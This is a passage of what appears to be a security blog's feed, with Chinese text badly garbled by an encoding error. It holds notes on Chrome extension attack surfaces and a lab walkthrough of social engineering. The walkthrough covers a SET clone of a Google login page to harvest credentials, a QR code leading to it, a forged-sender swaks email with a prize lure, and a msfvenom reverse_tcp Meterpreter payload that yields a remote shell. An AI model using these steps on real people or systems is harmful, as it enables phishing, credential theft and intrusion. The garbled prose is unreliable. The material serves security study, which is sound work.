href="https://developer.chrome.google.cn/docs/extensions/reference/manifest/content-scripts?hl=zh-cn">https://developer.chrome.google.cn/docs/extensions/reference/manifest/content-scripts?hl=zh-cn</a></p><p>åœ¨æ¯ä¸ªæ ‡ç­¾é¡µä¸­è¿è¡Œï¼Œæ¯ä¸ªæ‰©å±•<strong>ä¸€ä¸ªéš”ç¦»ç¯å¢ƒ</strong>ï¼Œæœ‰ç‹¬ç«‹çš„<code>JavaScript</code>å˜é‡ï¼Œ<code>CSP</code>ç­–ç•¥ç­‰ï¼ŒåŒæ—¶æ‹¥æœ‰ä¸€éƒ¨åˆ†Chrome APIåŠŸèƒ½ï¼Œ<strong>åªä¸ç½‘é¡µä¸­çš„JSä½¿ç”¨åŒä¸€ä¸ª<code>DOM</code></strong></p><p>ä¸€èˆ¬ç”¨æ¥å¤„ç†ä¸ç½‘é¡µ<code>DOM</code>ç›¸å…³çš„åŠŸèƒ½ï¼Œæˆ–ä¸<code>Background scripts</code>é€šä¿¡äº¤äº’å®Œæˆç›¸å…³åŠŸèƒ½</p><p>åŒæºç­–ç•¥ä¸æ‰€åœ¨çš„æ ‡ç­¾é¡µç›¸åŒ</p><pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token property">"content_scripts"</span><span class="token operator">:</span> <span class="token punctuation">[</span>    <span class="token punctuation">&#123;</span>        <span class="token property">"matches"</span><span class="token operator">:</span> <span class="token punctuation">[</span><span class="token string">"*://*/*"</span><span class="token punctuation">]</span><span class="token punctuation">,</span>        <span class="token property">"js"</span><span class="token operator">:</span> <span class="token punctuation">[</span><span class="token string">"contentScript.bundle.js"</span><span class="token punctuation">]</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>matchesï¼šå°†å†…å®¹è„šæœ¬æ³¨å…¥åˆ°çš„ç½‘å€æ ¼å¼ï¼Œè¿™é‡ŒåŒ¹é…æ‰€æœ‰çš„ç½‘å€</li><li>jsï¼šæ³¨å…¥ç½‘é¡µçš„ js è„šæœ¬</li></ul><p><img src="/blog/Chrome%E6%89%A9%E5%B1%95%E6%94%BB%E5%87%BB/image-20241218194441943.png" alt="image-20241218194441943"></p><p><img src="/blog/Chrome%E6%89%A9%E5%B1%95%E6%94%BB%E5%87%BB/image-20241218194514408.png" alt="image-20241218194514408"></p><hr><h3 id="Inject-scripts"><a href="#Inject-scripts" class="headerlink" title="Inject scripts"></a>Inject scripts</h3><p>ç”±äº<code>Content scripts</code>ä¸ç½‘é¡µéš”ç¦»ï¼Œæœ‰äº›åŠŸèƒ½åˆéœ€è¦è®¿é—®ç½‘é¡µç©ºé—´ä¸­çš„æ•°æ®</p><p>é‚£ä¹ˆæ‰©å±•ç¨‹åºå¾€å¾€ä¼šåœ¨<code>Content scripts</code>ä¸­é€šè¿‡<code>DOM</code>æ³¨å…¥å„ç§æ ‡ç­¾ï¼Œå½“ç„¶ä¹ŸåŒ…æ‹¬<code>script</code></p><p>è¿™é‡Œæ˜¯åœ¨ contentScript.bundle.js é‡Œé¢è¿›è¡Œæ’å…¥çš„</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">var</span> style <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">createElement</span><span class="token punctuation">(</span><span class="token string">'style'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>style<span class="token punctuation">.</span>textContent <span class="token operator">=</span> styles<span class="token punctuation">;</span>document<span class="token punctuation">.</span>head<span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span>style<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>å¦‚æœæ’å…¥çš„æ˜¯ script æ ‡ç­¾ä¾¿ä¼šå¼•å…¥ä¸€äº›æ”»å‡»é¢</p><hr><h2 id="Background-scripts"><a href="#Background-scripts" class="headerlink" title="Background scripts"></a>Background scripts</h2><p>æ‰©å±•ç¨‹åºçš„åå°æœåŠ¡ï¼Œæ‹¥æœ‰å®Œæ•´çš„Chrome APIåŠŸèƒ½ï¼Œä½†ä¸èƒ½ç›´æ¥è®¿é—®<code>DOM</code></p><p>ä¸€èˆ¬ç”¨äºæŒç»­è¿è¡Œçš„åŠŸèƒ½ï¼Œæˆ–ä¾èµ–ç›¸å…³Chrome APIçš„åŠŸèƒ½</p><p>åœ¨ä¸€å®šçš„æƒé™è®¾å®šä¸‹ï¼Œæ— åŒæºç­–ç•¥é™åˆ¶</p><p>åœ¨Manifest V2ä¸­æ˜¯ä¸€ä¸ªHTMLï¼Œå«<code>background.html</code>ï¼Œå¦‚æœæ˜¯JSçš„è¯ä¼šè‡ªåŠ¨ç”Ÿæˆä¸€ä¸ªHTML</p><p>åœ¨Manifest V3ä¸­æ˜¯ä¸€ä¸ªJSï¼Œå«<code>Service Worker</code></p><pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token property">"background"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>    <span class="token property">"service_worker"</span><span class="token operator">:</span> <span class="token string">"background.bundle.js"</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="/blog/Chrome%E6%89%A9%E5%B1%95%E6%94%BB%E5%87%BB/image-20241218194904970.png" alt="image-20241218194904970"></p><p>background.bundle.js é‡Œå¯¹åº”çš„ä»£ç </p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">chrome<span class="token punctuation">.</span>runtime<span class="token punctuation">.</span>onInstalled<span class="token punctuation">.</span><span class="token function">addListener</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">t</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token string">"install"</span><span class="token operator">===</span>t<span class="token punctuation">.</span>reason <span class="token operator">&amp;&amp;</span> chrome<span class="token punctuation">.</span>tabs<span class="token punctuation">.</span><span class="token function">create</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token literal-property property">url</span><span class="token operator">:</span> <span class="token string">"chrome://newtab"</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>ç›‘å¬å®‰è£…è¡Œä¸ºï¼Œåœ¨å®‰è£…æ­¤æ‰©å±•æ—¶åœ¨æµè§ˆå™¨æ‰“å¼€ä¸€ä¸ªæ–°æ ‡ç­¾é¡µ</p><hr><h3 id="Popup"><a href="#Popup" class="headerlink" title="Popup"></a>Popup</h3><p>å®šä¹‰çš„ä½ç½®åœ¨ action çš„ default_popup</p><p>æ˜¯ç‚¹å‡»æ‰©å±•å›¾æ ‡åå¼¹å‡ºçš„é¡µé¢ï¼Œæƒé™ä¸<code>Background</code>ç»„ä»¶ç›¸åŒ</p><p>ä»¥ æ²‰æµ¸å¼ç¿»è¯‘ ä¸ºä¾‹å­ï¼š</p><pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token property">"action"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>    <span class="token property">"default_icon"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>        <span class="token property">"128"</span><span class="token operator">:</span> <span class="token string">"icons/128.png"</span><span class="token punctuation">,</span>        <span class="token property">"256"</span><span class="token operator">:</span> <span class="token string">"icons/256.png"</span><span class="token punctuation">,</span>        <span class="token property">"32"</span><span class="token operator">:</span> <span class="token string">"icons/32.png"</span><span class="token punctuation">,</span>        <span class="token property">"48"</span><span class="token operator">:</span> <span class="token string">"icons/48.png"</span><span class="token punctuation">,</span>        <span class="token property">"64"</span><span class="token operator">:</span> <span class="token string">"icons/64.png"</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>    <span class="token property">"default_popup"</span><span class="token operator">:</span> <span class="token string">"popup.html"</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/blog/Chrome%E6%89%A9%E5%B1%95%E6%94%BB%E5%87%BB/image-20241218195819564.png" alt="image-20241218195819564"></p><h3 id="options-page"><a href="#options-page" class="headerlink" title="options_page"></a>options_page</h3><p>ä¸ºæ‰©å±•çš„é€‰é¡¹é¡µï¼Œæƒé™ä¸<code>Background</code>ç»„ä»¶ç›¸åŒ</p><hr><h2 id="é€šä¿¡æ¶æ„"><a href="#é€šä¿¡æ¶æ„" class="headerlink" title="é€šä¿¡æ¶æ„"></a>é€šä¿¡æ¶æ„</h2><p><img src="/blog/Chrome%E6%89%A9%E5%B1%95%E6%94%BB%E5%87%BB/image-20241218200053198.png" alt="image-20241218200053198"></p><p>Webpage æ˜¯æŒ‡ç½‘é¡µ Javascript çš„ç©ºé—´ï¼Œä¸ Content å…±äº« DOMï¼Œå…¶ä¸­ window æ¯”è¾ƒç‰¹æ®Šï¼Œè™½ç„¶æ˜¯å…±ç”¨ä¸€ä¸ª windowï¼Œä½†æœ‰å˜é‡éš”ç¦»</p><p>ç”±äºå…±ç”¨ window ï¼ŒWebpage ä¸ Content å¯ä»¥ä½¿ç”¨<code>window.postMessage</code>è¿›è¡Œé€šä¿¡</p><p>å½“ Content è°ƒç”¨<code>chrome.runtime.sendMessage</code>æ—¶å…¶å®åœ¨å‘æ‰€æœ‰ Background é¡µé¢ä¸­å¹¿æ’­</p><p>åŒç†ï¼ŒBackground é¡µé¢ä¹‹é—´ä½¿ç”¨<code>chrome.runtime.sendMessage</code>å‘é€æ¶ˆæ¯æ—¶ä¹Ÿç›¸å½“äºåœ¨å¹¿æ’­</p><hr><h1 id="æ¼æ´åˆ†æ"><a href="#æ¼æ´åˆ†æ" class="headerlink" title="æ¼æ´åˆ†æ"></a>æ¼æ´åˆ†æ</h1><p>å‰ç«¯æ¼æ´ä¸»è¦è¿˜æ˜¯å›´ç»• XSS å’Œ CSRF</p><p>è€Œ Chrome Manifest V3 ä¸­è§„å®šç¦æ­¢ä»£ç æ‰§è¡Œï¼Œç¦æ­¢åŠ è½½è¿œç¨‹èµ„æºï¼Œä½“ç°åœ¨CSPä¸­æ— æ³•æ·»åŠ <code>unsafe-eval</code>å’Œ<code>unsafe-inline</code>ï¼Œä¹Ÿæ— æ³•æ·»åŠ ä»»ä½•è¿œç¨‹åœ°å€ï¼Œå¯¼è‡´æƒ³è¦åœ¨ Manifest V3 å®ç° XSS éå¸¸å›°éš¾</p><h2 id="Content-scripts-1"><a href="#Content-scripts-1" class="headerlink" title="Content scripts"></a>Content scripts</h2><h3 id="DOM"><a href="#DOM" class="headerlink" title="DOM"></a>DOM</h3><p>ç”±äº Content scripts ä¸ç½‘é¡µ JS å…±äº«<code>DOM</code></p><p>å¯¹äºæ”»å‡»è€…æ¥è¯´ï¼Œæ”»å‡»å…¥å£åŒ…æ‹¬æ•´ä¸ª DOM</p><h3 id="DOM-Event"><a href="#DOM-Event" class="headerlink" title="DOM  Event"></a>DOM  Event</h3><p>é™¤äº†<code>Content</code>å»ç›´æ¥æŸ¥è¯¢<code>DOM</code>å…ƒç´ ï¼Œè¿˜æœ‰è®¢é˜…äº‹ä»¶</p><h3 id="onmessage"><a href="#onmessage" class="headerlink" title="onmessage"></a>onmessage</h3><p>ç”±äº<code>Content scripts</code>ä¸ç½‘é¡µä½¿ç”¨åŒä¸€ä¸ª<code>window</code>ï¼Œ<code>postMessage</code>å°†ç›´æ¥ä¸<code>Content scripts</code>é€šä¿¡</p><p>å¦‚æœæ²¡æœ‰æ ¡éªŒæ¥æºï¼Œç”šè‡³å¯ä»¥åˆ©ç”¨ iframe æˆ–è€… window.open è·å–ç›®æ ‡windowï¼Œè·¨åŸŸå‘é€æ¶ˆæ¯ç›´è¾¾<code>Content scripts</code>å®Œæˆæ”»å‡»</p><h3 id="window-name"><a href="#window-name" class="headerlink" title="window.name"></a>window.name</h3><p>è™½ç„¶è¯´<code>Content</code>ä¸ç½‘é¡µéš”ç¦»ï¼Œå˜é‡ä¸èƒ½å…±äº«ï¼Œä½†æ˜¯<code>window.name</code>æ˜¯ä¸ªä¾‹å¤–</p><h3 id="Web-Storage"><a href="#Web-Storage" class="headerlink" title="Web Storage"></a>Web Storage</h3><p>å¦‚æœåœ¨<code>Content</code>ä¸­ä½¿ç”¨Web Storageï¼Œå…¶å®æ˜¯åœ¨ä½¿ç”¨å½“å‰ç½‘ç«™çš„å­˜å‚¨ï¼Œè€Œä¸æ˜¯æ‰©å±•ç¨‹åºè‡ªå·±çš„</p><p>å†™å…¥Web Storageå­˜åœ¨ä¿¡æ¯æ³„éœ²ï¼ŒåŒæ—¶è¯»å–Web Storageä¹Ÿæ˜¯ç”¨æˆ·è¾“å…¥</p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;å‰è¨€&quot;&gt;&lt;a href=&quot;#å‰è¨€&quot; class=&quot;headerlink&quot; title=&quot;å‰è¨€&quot;&gt;&lt;/a&gt;å‰è¨€&lt;/h1&gt;&lt;p&gt;ä¹‹å‰æ‰“ GeekGame çš„æ—¶å€™å°±é‡åˆ°è¿‡åˆ©ç”¨ chrome æ‰©å±•è¿›è¡Œ xss çš„é¢˜ï¼Œæ­£å¥½çœ‹åˆ°æœ‰ç›¸å…³çš„æ–‡ç« ï¼Œé‚å­¦ä¹ ä¸€ä¸‹&lt;/p&gt;
&lt;p&gt;å‚è€ƒï¼š&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://blog.xlab.app/p/4db211d1/&quot;&gt;https://blog.xlab.app/p/4db211d1/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://blog.xlab.app/p/4db211d2/&quot;&gt;https://blog.xlab.app/p/4db211d2/&lt;/a&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="Web" scheme="http://c1oudfl0w0.github.io/blog/categories/Web/"/>
    
    
  </entry>
  
  <entry>
    <title>ç¤¾ä¼šå·¥ç¨‹å­¦</title>
    <link href="http://c1oudfl0w0.github.io/blog/2024/12/12/%E7%A4%BE%E4%BC%9A%E5%B7%A5%E7%A8%8B%E5%AD%A6/"/>
    <id>http://c1oudfl0w0.github.io/blog/2024/12/12/%E7%A4%BE%E4%BC%9A%E5%B7%A5%E7%A8%8B%E5%AD%A6/</id>
    <published>2024-12-12T06:25:22.000Z</published>
    <updated>2024-12-12T08:53:59.004Z</updated>
    
    <content type="html"><![CDATA[<h1 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h1><p><del>æˆ‘è¶…ï¼Œç›’ï¼çˆ±ä¸½ä¸é”™äº†çˆ±ä¸½ä¸ä¸è¯¥åœ¨ç½‘ä¸Šå£å—¨çš„</del></p><span id="more"></span><hr><h1 id="Setoolkit"><a href="#Setoolkit" class="headerlink" title="Setoolkit"></a>Setoolkit</h1><p>Setoolkit æ˜¯ä¸€ä¸ªä¸ºç¤¾ä¼šå·¥ç¨‹è®¾è®¡çš„å¼€æºæ¸—é€æµ‹è¯•æ¡†æ¶ã€‚SET å…·æœ‰è®¸å¤šè‡ªå®šä¹‰æ”»å‡»å‘é‡ï¼Œå¯è®©æˆ‘ä»¬å¿«é€Ÿè¿›è¡Œå¯ä¿¡çš„æ”»å‡»ã€‚</p><p>root å¯åŠ¨ setoolkit</p><p><img src="/blog/2024/12/12/%E7%A4%BE%E4%BC%9A%E5%B7%A5%E7%A8%8B%E5%AD%A6/image-20241212143724005.png" alt="image-20241212143724005"></p><p>é»˜è®¤ä¼šæœ‰å¦‚ä¸‹é€‰é¡¹ï¼š</p><ul><li>Social-Engineering Attacks ##ç¤¾ä¼šå·¥ç¨‹å­¦æ”»å‡»</li><li>Penetration Testing (Fast-Track) ##å¿«é€Ÿè¿½è¸ªæµ‹è¯•</li><li>Third Party Modules ##ç¬¬ä¸‰æ–¹æ¨¡å—</li><li>Update the Social-Engineer Toolkit ##å‡çº§è½¯ä»¶</li><li>Update SET configuration ##å‡çº§é…ç½®</li><li>Help, Credits, and About ##å¸®åŠ©</li></ul><h2 id="æ­¥éª¤"><a href="#æ­¥éª¤" class="headerlink" title="æ­¥éª¤"></a>æ­¥éª¤</h2><h3 id="åˆ¶ä½œé’“é±¼ç½‘ç«™"><a href="#åˆ¶ä½œé’“é±¼ç½‘ç«™" class="headerlink" title="åˆ¶ä½œé’“é±¼ç½‘ç«™"></a>åˆ¶ä½œé’“é±¼ç½‘ç«™</h3><p>é€‰æ‹© 1</p><p><img src="/blog/2024/12/12/%E7%A4%BE%E4%BC%9A%E5%B7%A5%E7%A8%8B%E5%AD%A6/image-20241212143953923.png" alt="image-20241212143953923"></p><ol><li><p>é±¼å‰å¼ç½‘ç»œé’“é±¼</p></li><li><p>ç½‘é¡µæ”»å‡» é’“é±¼</p></li><li><p>æ„ŸæŸ“æ€§æ€§æ”»å‡»ï¼Œå°±æ˜¯æœ¨é©¬</p></li><li><p>å»ºç«‹ payloaad å’Œ listener</p></li><li><p>é‚®ä»¶ç¾¤å‘æ”»å‡»</p></li><li><p>Arduino åŸºç¡€æ”»å‡»</p></li><li><p>æ— çº¿æ¥å…¥ç‚¹æ”»å‡»</p></li><li><p>äºŒç»´ç æ”»å‡»</p></li><li><p>Powershell æ”»å‡»</p></li><li><p>ç¬¬ä¸‰åæ¨¡å—</p></li></ol><p>è¿™é‡Œé€‰æ‹© 2</p><p><img src="/blog/2024/12/12/%E7%A4%BE%E4%BC%9A%E5%B7%A5%E7%A8%8B%E5%AD%A6/image-20241212144123364.png" alt="image-20241212144123364"></p><ul><li>Java Applet Attack Method ## java ç¨‹åºæ”»å‡»</li><li>Metasploit Browser Exploit Method ##Metasploit æµè§ˆå™¨æ¼æ´æ”»å‡»</li><li>Credential Harvester Attack Method ##é’“é±¼ç½‘ç«™æ”»å‡»</li><li>Tabnabbing Attack Method</li><li>Web Jacking Attack Method ## ç½‘ç«™ jacking æ”»å‡»</li><li>Multi-Attack Web Method ## å¤šç§ç½‘ç«™æ”»å‡»æ–¹å¼</li><li>HTA Attack Method</li><li>Return to Main Menu</li></ul><p>é€‰æ‹© 3</p><p><img src="/blog/2024/12/12/%E7%A4%BE%E4%BC%9A%E5%B7%A5%E7%A8%8B%E5%AD%A6/image-20241212144459114.png" alt="image-20241212144459114"></p><ul><li>Web Templates ## web</li><li>Site Cloner ## ç½‘ç«™å…‹éš†è®¾ç½®</li><li>Custom Import ## è‡ªå®šä¹‰å¯¼å…¥</li><li>Return to Webattack Menu</li></ul><p>é€‰æ‹© 1</p><p><img src="/blog/2024/12/12/%E7%A4%BE%E4%BC%9A%E5%B7%A5%E7%A8%8B%E5%AD%A6/image-20241212144743612.png" alt="image-20241212144743612"></p><p>æŒ‡å®š ipï¼Œç„¶åé€‰æ‹©è¦ä¼ªé€ çš„é¡µé¢ï¼Œè¿™é‡Œé€‰æ‹©ä¼ªé€  google çš„é¡µé¢</p><p><img src="/blog/2024/12/12/%E7%A4%BE%E4%BC%9A%E5%B7%A5%E7%A8%8B%E5%AD%A6/image-20241212145009413.png" alt="image-20241212145009413"></p><p><img src="/blog/2024/12/12/%E7%A4%BE%E4%BC%9A%E5%B7%A5%E7%A8%8B%E5%AD%A6/image-20241212144944674.png" alt="image-20241212144944674"></p><p>æˆåŠŸå¯åŠ¨ï¼Œå°è¯•è¾“å…¥è´¦å¯†ï¼Œç‚¹å‡»ç™»å½•ï¼Œä¼šé‡å®šå‘åˆ° Google æœç´¢å¼•æ“</p><p><img src="/blog/2024/12/12/%E7%A4%BE%E4%BC%9A%E5%B7%A5%E7%A8%8B%E5%AD%A6/image-20241212145127768.png" alt="image-20241212145127768"></p><p>äºæ˜¯æ¶æ„æœåŠ¡ç«¯ä¼šæ”¶åˆ°è´¦å¯†</p><hr><h3 id="äºŒç»´ç é’“é±¼"><a href="#äºŒç»´ç é’“é±¼" class="headerlink" title="äºŒç»´ç é’“é±¼"></a>äºŒç»´ç é’“é±¼</h3><p>SET å·¥å…·åŒ…ä¸­å¯ä»¥ä½¿ç”¨ QR Code Attack æ¨¡å—å‘èµ·äºŒç»´ç æ”»å‡»ï¼Œä½¿è¢«æ¬ºéª—ç”¨æˆ·æ‰«æä½ çš„äºŒç»´ç è¿›å…¥ä¸€ä¸ªä¼ªè£…é’“é±¼ç½‘ç«™</p><p>é€‰æ‹©æ¨¡å— 8</p><p><img src="/blog/2024/12/12/%E7%A4%BE%E4%BC%9A%E5%B7%A5%E7%A8%8B%E5%AD%A6/image-20241212145720164.png" alt="image-20241212145720164"></p><p>è¾“å…¥è¦è·³è½¬çš„é’“é±¼ç½‘ç«™çš„åœ°å€ï¼š192.168.253.128ï¼Œç”ŸæˆäºŒç»´ç </p><p><img src="/blog/2024/12/12/%E7%A4%BE%E4%BC%9A%E5%B7%A5%E7%A8%8B%E5%AD%A6/image-20241212150217152.png" alt="image-20241212150217152"></p><p><img src="/blog/2024/12/12/%E7%A4%BE%E4%BC%9A%E5%B7%A5%E7%A8%8B%E5%AD%A6/image-20241212150514405.png" alt="image-20241212150514405"></p><p>è§£æä¸€ä¸‹äºŒç»´ç ï¼Œå°±æ˜¯æˆ‘ä»¬åˆšæ‰é’“é±¼ç½‘ç«™çš„ ipï¼Œå¦‚æœç›´æ¥æ‰«ç å°±ä¼šè·³è½¬åˆ°é’“é±¼ç½‘ç«™</p><p><img src="/blog/2024/12/12/%E7%A4%BE%E4%BC%9A%E5%B7%A5%E7%A8%8B%E5%AD%A6/image-20241212150714846.png" alt="image-20241212150714846"></p><hr><h1 id="é’“é±¼é‚®ä»¶"><a href="#é’“é±¼é‚®ä»¶" class="headerlink" title="é’“é±¼é‚®ä»¶"></a>é’“é±¼é‚®ä»¶</h1><p>å½“æ”»å‡»è€…åˆ¶ä½œäº†é’“é±¼ç½‘ç«™ã€æœ¨é©¬ç¨‹åºåï¼Œä¾¿ä¼šæƒ³æ³•è®¾æ³•å°†å…¶ä¼ ç»™å—å®³è€…ï¼Œè€Œå¸¸è§çš„ä¼ æ’­æ–¹å¼ä¾¿æ˜¯é’“é±¼ç½‘ç«™ã€‚å®‰å…¨æ„è¯†è¾ƒå·®çš„ç”¨æˆ·åœ¨æ”¶åˆ°é’“é±¼é‚®ä»¶åç‚¹å‡»é‚®ä»¶ä¸­çš„é’“é±¼é“¾æ¥ã€ä¸‹è½½é™„ä»¶ä¸­çš„æœ¨é©¬ç¨‹åºï¼Œä¾¿å¯èƒ½é­å—æ”»å‡»</p><p>Swaks æ˜¯ä¸€æ¬¾ç±»ä¼¼äºâ€œç‘å£«å†›åˆ€â€çš„å·¥å…·ï¼Œä¹‹æ‰€ä»¥è¿™ä¹ˆè¯´æ˜¯å› ä¸ºå®ƒåœ¨ SMTP é‚®ä»¶åè®®é¢†åŸŸæœ‰éå¸¸éå¸¸å¹¿æ³›çš„åº”ç”¨ï¼Œå®ƒé€šå¸¸è¢«ç”¨æ¥ä¼ªé€ é‚®ä»¶ï¼Œè¿›è¡Œé’“é±¼ã€ç¤¾å·¥ç­‰æ“ä½œ</p><p><img src="/blog/2024/12/12/%E7%A4%BE%E4%BC%9A%E5%B7%A5%E7%A8%8B%E5%AD%A6/image-20241212151311380.png" alt="image-20241212151311380"></p><h2 id="æ­¥éª¤-1"><a href="#æ­¥éª¤-1" class="headerlink" title="æ­¥éª¤"></a>æ­¥éª¤</h2><p>å…ˆç”³è¯·ä¸€ä¸ªä¸´æ—¶é‚®ç®±ç”¨äºæ”¶ä»¶ï¼Œæœ¬æ¬¡ä½¿ç”¨çš„ä¸´æ—¶é‚®ç®±ç½‘ç«™æ˜¯ï¼š<a href="http://24mail.chacuo.net/?continueFlag=e50436a75b1a77d2a32a07038cb58972">http://24mail.chacuo.net/?continueFlag=e50436a75b1a77d2a32a07038cb58972</a></p><p>ä¼ª é€  ä¸€ ä»½ æ¥ è‡ª l0w1ro çš„ é‚® ä»¶ ï¼Œ æ”¶ ä»¶ äºº ä¸º <a href="mailto:&#x64;&#101;&#115;&#x69;&#103;&#110;&#97;&#110;&#x74;&#53;&#49;&#x37;&#51;&#54;&#x40;&#x30;&#x32;&#55;&#x31;&#x36;&#x38;&#46;&#99;&#111;&#x6d;">&#x64;&#101;&#115;&#x69;&#103;&#110;&#97;&#110;&#x74;&#53;&#49;&#x37;&#51;&#54;&#x40;&#x30;&#x32;&#55;&#x31;&#x36;&#x38;&#46;&#99;&#111;&#x6d;</a> ï¼Œ å†… å®¹ ä¸º : <code>&quot;Congratulations on obtaining 20000 Memories! Please click on the following link to get the redemption code: http://example.com/&quot;</code></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> swaks <span class="token parameter variable">--to</span> designant51736@027168.com <span class="token parameter variable">--from</span> l0w1ro@616.sb <span class="token parameter variable">--ehlo</span> <span class="token number">616</span>.sb <span class="token parameter variable">--body</span> <span class="token string">"Congratulations on obtaining 20000 Memories! Please click on the following link to get the redemption code: http://example.com/"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/blog/2024/12/12/%E7%A4%BE%E4%BC%9A%E5%B7%A5%E7%A8%8B%E5%AD%A6/image-20241212153153141.png" alt="image-20241212153153141"></p><p><img src="/blog/2024/12/12/%E7%A4%BE%E4%BC%9A%E5%B7%A5%E7%A8%8B%E5%AD%A6/image-20241212153230252.png" alt="image-20241212153230252"></p><hr><h1 id="è¿œæ§æœ¨é©¬"><a href="#è¿œæ§æœ¨é©¬" class="headerlink" title="è¿œæ§æœ¨é©¬"></a>è¿œæ§æœ¨é©¬</h1><p>SET åŒæ—¶é›†æˆäº†æœ¨é©¬ç”Ÿæˆå·¥å…·ï¼Œå¯ä»¥ç”Ÿæˆæœ¨é©¬å¹¶è°ƒç”¨ MSF æ¡†æ¶å¯¹è¿œç¨‹ä¸»æœºè¿›è¡Œæ§åˆ¶</p><h2 id="æ­¥éª¤-2"><a href="#æ­¥éª¤-2" class="headerlink" title="æ­¥éª¤"></a>æ­¥éª¤</h2><p>é€‰æ‹©æ¨¡å— 4</p><p><img src="/blog/2024/12/12/%E7%A4%BE%E4%BC%9A%E5%B7%A5%E7%A8%8B%E5%AD%A6/image-20241212154514509.png" alt="image-20241212154514509"></p><p>é€‰æ‹©æ”»å‡»æ¨¡å¼ï¼Œç„¶åè®¾ç½®ç›‘å¬çš„ä¸»æœº IP(kali æ”»å‡»æœºçš„ IP åœ°å€)å’Œç«¯å£ï¼Œå³å¯åœ¨æœ¬åœ°ç”Ÿæˆæœ¨é©¬ç¨‹åº</p><p><img src="/blog/2024/12/12/%E7%A4%BE%E4%BC%9A%E5%B7%A5%E7%A8%8B%E5%AD%A6/image-20241212154908488.png" alt="image-20241212154908488"></p><p>ä½¿ç”¨ python åœ¨ &#x2F;root&#x2F;.set&#x2F; ä¸‹èµ· http æœåŠ¡ä¼ è¾“ payload.exeï¼ˆå¦‚æœå‘ç° payload.exe å¤§å°ä¸º 0 åˆ™è¯´æ˜ç”Ÿæˆå¤±è´¥ï¼Œä½¿ç”¨<code>msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.253.128 LPORT=8000 -a x86 --platform Windows -f exe &gt; payload.exe</code>æ¥è§‚å¯ŸæŠ¥é”™ï¼‰</p><p><img src="/blog/2024/12/12/%E7%A4%BE%E4%BC%9A%E5%B7%A5%E7%A8%8B%E5%AD%A6/image-20241212164132551.png" alt="image-20241212164132551"></p><p><img src="/blog/2024/12/12/%E7%A4%BE%E4%BC%9A%E5%B7%A5%E7%A8%8B%E5%AD%A6/image-20241212164310470.png" alt="image-20241212164310470"></p><p>è¿è¡Œæœ¨é©¬</p><p><img src="/blog/2024/12/12/%E7%A4%BE%E4%BC%9A%E5%B7%A5%E7%A8%8B%E5%AD%A6/image-20241212164329371.png" alt="image-20241212164329371"></p><p><img src="/blog/2024/12/12/%E7%A4%BE%E4%BC%9A%E5%B7%A5%E7%A8%8B%E5%AD%A6/image-20241212164437913.png" alt="image-20241212164437913"></p><p>æ£€æµ‹åˆ°äº† winxp çš„ ip åœ°å€</p><p>åœ¨çª—å£ä¸­å›è½¦æ¿€æ´» Meterpreter ä¼šè¯ï¼Œ<code>sessions -i 1</code> è·å– shellæ§åˆ¶æƒé™</p><p>sysinfo æŸ¥çœ‹ç³»ç»Ÿä¿¡æ¯ï¼Œscreenshot è¿›è¡Œå±å¹•æˆªå›¾</p><p><img src="/blog/2024/12/12/%E7%A4%BE%E4%BC%9A%E5%B7%A5%E7%A8%8B%E5%AD%A6/image-20241212164640654.png" alt="image-20241212164640654"></p><p><img src="/blog/2024/12/12/%E7%A4%BE%E4%BC%9A%E5%B7%A5%E7%A8%8B%E5%AD%A6/image-20241212164905169.png" alt="image-20241212164905169"></p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;å‰è¨€&quot;&gt;&lt;a href=&quot;#å‰è¨€&quot; class=&quot;headerlink&quot; title=&quot;å‰è¨€&quot;&gt;&lt;/a&gt;å‰è¨€&lt;/h1&gt;&lt;p&gt;&lt;del&gt;æˆ‘è¶…ï¼Œç›’ï¼çˆ±ä¸½ä¸é”™äº†çˆ±ä¸½ä¸ä¸è¯¥åœ¨ç½‘ä¸Šå£å—¨çš„&lt;/del&gt;&lt;/p&gt;</summary>
    
    
    
    
  </entry>
  
  <entry>
    <title>æ¸¸æˆé€†å‘</title>
    <link href="http://c1oudfl0w0.github.io/blog/2024/12/11/%E6%B8%B8%E6%88%8F%E9%80%86%E5%90%91/"/>
